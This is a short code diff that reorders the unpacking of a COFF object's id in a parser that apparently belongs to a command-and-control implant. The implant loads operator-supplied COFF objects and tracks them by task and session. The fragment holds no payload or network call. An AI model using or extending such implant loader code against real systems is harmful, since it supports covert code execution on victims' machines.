@@ -228,12 +228,12 @@ namespace Memory {
 
             _coff_params* coff = (_coff_params*) Malloc(sizeof(_coff_params));
 
-            coff->coff_id       = UnpackUint32(&parser);
             coff->entrypoint    = UnpackString(&parser, (uint32_t*) &coff->entrypoint_length);
             coff->data          = UnpackBytes(&parser, (uint32_t*) &coff->data_size);
             coff->args          = UnpackBytes(&parser, (uint32_t*) &coff->args_size);
             coff->b_cache       = UnpackByte(&parser);
             coff->task_id       = Ctx->session.current_taskid;
+            coff->coff_id       = UnpackUint32(&parser);
 
             AddCoff(coff);
 
